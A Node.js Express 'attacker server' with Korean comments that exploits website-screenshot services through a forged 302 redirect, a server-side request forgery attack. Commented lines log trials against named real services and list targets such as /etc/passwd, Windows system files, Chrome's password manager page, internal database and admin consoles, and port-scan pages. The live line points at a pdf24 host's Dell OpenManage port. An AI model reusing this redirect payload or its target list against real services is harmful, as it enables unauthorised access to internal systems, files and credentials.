// attacker server

const express = require('express');
const app = express();

app.use(express.static('public'));


app.get('/main', (req, res) => {
  
    //res.redirect('http://127.0.0.1:4000/screenshot/?url=file://F://GGG//passwd'); // internal server error 발생
    //res.redirect('http://127.0.0.1:4000/screenshot/?url=file://F://GGG//passwd'); // nodejs자체에서 보안상 허용안함
    //res.redirect('https://google.com');  // 동작 잘됨
    // 그래서 동일한 효과를 낼 수 있도록 강제로 http헤더를 조작해서 응답하자

    res.status(302);             // HTTP 상태 코드를 302로 설정
    // 'Location' 헤더에 리다이렉트 대상 URL 설정
    //res.setHeader('Location', 'http://google.com');     // 잘됨
    //res.setHeader('Location', 'http:////google.com');  // 잘됨
    //res.setHeader('Location', 'http://naver.com');  //  // 잘됨
    //res.setHeader('Location', 'http://127.0.0.1:4000/sitecapture.html');  // 잘됨
    //res.setHeader('Location', 'http://127.0.0.1:5000/main');  // 안됨 - redirect 무한루프때문인가?
    //res.setHeader('Location', 'http://127.0.0.1:7000');  // 잘됨
    //res.setHeader('Location', 'https://127.0.0.1:7000');  // 안됨 Error: net::ERR_SSL_PROTOCOL_ERROR  - 서버 인증서가 없어서 발생한듯함
    //res.setHeader('Location', 'file://F://passwd');  // file://프로토콜은 크롬에서 엄격하게 제한하고 있다고 함
    //res.setHeader('Location', 'http://127.0.0.1:5000/getServerInfo.html');  // 웹서버 정보 취득 가능
    //res.setHeader('Location', 'http://127.0.0.1:5000/getInterServerScan.html');  // 내부시스템에 대한 port scan 정보 취득
  
    //// https://www.url2png.com/  ++ https://spice-sudden-haircut.glitch.me/main 입력함
    //res.setHeader('Location', 'http://google.com'); // 잘됨
    //res.setHeader('Location', 'http://naver.com');  // 잘됨
    //res.setHeader('Location', 'https://spice-sudden-haircut.glitch.me/getServerInfo.html');  // 직전에 screenshot성공한 것을 보여줌
    //res.setHeader('Location', 'https://spice-sudden-haircut.glitch.me/getInterServerScan.html');  // 직전에 screenshot성공한 것을 보여줌
    // ** filter 및 SSB 보안적용 (O)
   
    //// https://www.screenshotmachine.com/
    //res.setHeader('Location', 'http://google.com'); // 잘됨
    //res.setHeader('Location', 'http://naver.com');  // 잘됨
    //res.setHeader('Location', 'https://spice-sudden-haircut.glitch.me/getServerInfo.html');      // 직접 url에 넣어도 됨
    //res.setHeader('Location', 'https://spice-sudden-haircut.glitch.me/getInterServerScan.html'); // 직접 url에 넣어도 됨
    // ** filter 및 SSB 보안적용 (X) but 'file://'' 프로토콜은 필터적용한듯

  
    //res.setHeader('Location', 'file:///etc/passwd');  // file://프로토콜은 크롬에서 엄격하게 제한하고 있다고 함
    //res.setHeader('Location', 'http://google.com'); // 잘됨
    //res.setHeader('Location', 'https://spice-sudden-haircut.glitch.me/getServerInfo.html');      // 직접 url에 넣어도 됨
    //res.setHeader('Location', 'https://spice-sudden-haircut.glitch.me/getInterServerScan.html'); // 직접 url에 넣어도 됨
    //res.setHeader('Location', 'https://spice-sudden-haircut.glitch.me/getInterServerScan.html'); // 직접 url에 넣어도 됨
  
    //res.setHeader('Location', 'https://spice-sudden-haircut.glitch.me/listdir.html'); // listDir in targetserver(잘 안되는것 같음) 
  
    // +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//
    // https://www.page2images.com/
    //res.setHeader('Location', 'http://google.com'); // 안됨
    //res.setHeader('Location', 'https://www.page2images.com/resources/img/home_logo2.png'); // 안됨
  
    // https://www.url2png.com/
    //res.setHeader('Location', 'http://google.com'); 
    //res.setHeader('Location', 'https://api.url2png.com/v6/P4DF2F8BC83648/d31a1ea36027bbf821cc6c547defa7b7/png/?delay=2&fullpage=false&thumbnail_max_width=700&url=typekit.com&viewport=1024x512'); 
  
    // https://www.screenshotmachine.com/
    //res.setHeader('Location', 'https://www.screenshotmachine.com/assets/img/machine.png'); 
  
    // https://browshot.com/
    //res.setHeader('Location', 'http://google.com'); 
    
    //https://pikwy.com/
    //res.setHeader('Location', 'https://cdn.pikwy.com/r/bs4/img/logo187.png'); 
    
    //https://screenshotlayer.com/
    //res.setHeader('Location', 'https://screenshotlayer.com/images/logos/screenshotlayer_header.png'); 
  
    //https://grabz.it/
    //res.setHeader('Location', 'https://cdn.grabz.it/images/youtube/uXGJREbYNQU-400.png');   
  
    //https://webscreenshot.vercel.app/
    //res.setHeader('Location', 'https://spice-sudden-haircut.glitch.me/getServerInfo.html');   
    //res.setHeader('Location', 'https://webscreenshot.vercel.app/');   //https://127.0.0.1 안됨
  
    //res.setHeader('Location', 'http://127.0.0.1/');   
    //res.setHeader('Location', 'http://115.145.170.28:5000/openSW/webscan-main/beta.html');
  
    //res.setHeader('Location', 'file://C://Windows//System32//drivers//etc//hosts');
  

    //res.setHeader('Location', 'http://google.com'); 
    //res.setHeader('Location', 'https://www.bing.com/'); 
  
    //res.setHeader('Location', 'http://127.0.0.1/static/images/icon-1.png');    //Browshot
    //res.setHeader('Location', 'http://13.225.128.27/static/images/icon-1.png');    //Browshot   
  
    //res.setHeader('Location', 'https://capturefullpage.com/download.svg');    // OK-capturefullpage
    //res.setHeader('Location', 'https://127.0.0.1/download.svg');            // NO-capturefullpage
    //res.setHeader('Location', 'https://localhost/download.svg');            // NO-capturefullpage
    
    
    //res.setHeader('Location', 'http://127.0.0.1');   
  
    //res.setHeader('Location', 'file:///etc/passwd');   
    //res.setHeader('Location', 'file:///C://Windows//win.ini');
    //res.setHeader('Location', 'file://C://Windows//System32//drivers//etc//hosts'); 
  
    //res.setHeader('Location', 'http://google.com'); 
    //res.setHeader('Location', 'https://spice-sudden-haircut.glitch.me/getInterSerSc-time.html');   
  
    // mongodb
    //res.setHeader('Location', 'https://127.0.0.1:28017');   
    //res.setHeader('Location', 'http://127.1:28017');   
    //s.setHeader('Location', 'http://127.1:5000');      
  
    // mysql있을때
    //res.setHeader('Location', 'http://127.1/phpmyadmin');      
    //res.setHeader('Location', 'http://127.0.0.1:10000');      
  
    // oracle있을때 
    //res.setHeader('Location', 'http://127.1/apex');  
    
    // chrome정보 - SSB는 허용안한다고 함
    //res.setHeader('Location', 'chrome://bookmarks');  
    //res.setHeader('Location', 'chrome://accessibility'); //(X)
    //res.setHeader('Location', 'chrome://chrome-urls');
    //res.setHeader('Location', 'chrome://password-manager/passwords');
  
    //WSO2 API Manager(8280)  
    //res.setHeader('Location', 'https://127.0.0.1:9443/publisher');
    //res.setHeader('Location', 'https://127.0.0.1:9443/devportal');
    //res.setHeader('Location', 'https://127.1:9443/admin');
    //res.setHeader('Location', 'https://www.site-shot.com:9443/admin');
  
    //res.setHeader('Location', 'https://127.0.0.1:8000');
  
    // mysql
    //res.setHeader('Location', 'https://spice-sudden-haircut.glitch.me/getInterSerSc-time.html');
    //res.setHeader('Location', 'http://localhost/phpMyAdmin');
    //res.setHeader('Location', 'http://127.0.0.1/phpMyAdmin');   
    //res.setHeader('Location', 'https://tools.pdf24.org/phpMyAdmin');   
  
    // Dell OpenManage HTTP server
    //res.setHeader('Location', 'https://127.0.0.1:1311');   
    res.setHeader('Location', 'https://tools.pdf24.org:1311');   
  
  
  
    res.end();                  // 응답 종료

});

var server = app.listen(5000, function () {
  var host = server.address().address;
  var port = server.address().port;
  console.log('Attacker Server is working : PORT - ', port);
});




// // HTTP 서버를 생성하고 Express 앱을 바인딩
// const server = http.createServer(app);

// // keep-alive 타임아웃을 5분으로 설정
// server.timeout = 1 * 60 * 1000;  // 5 minutes

// server.listen(4000, function () {
//     var host = server.address().address;
//     var port = server.address().port;
//     console.log('Server is working : PORT - ', port);
// });



// [server]
// F:\GGG\nodeJS>node index_screenshot.js
// Server is working : PORT -  400

// [browser]
// http://127.0.0.1:4000/screenshot/?url=https://google.com


// F:\GGG\nodeJS>node index.js
// Server is working : PORT -  3000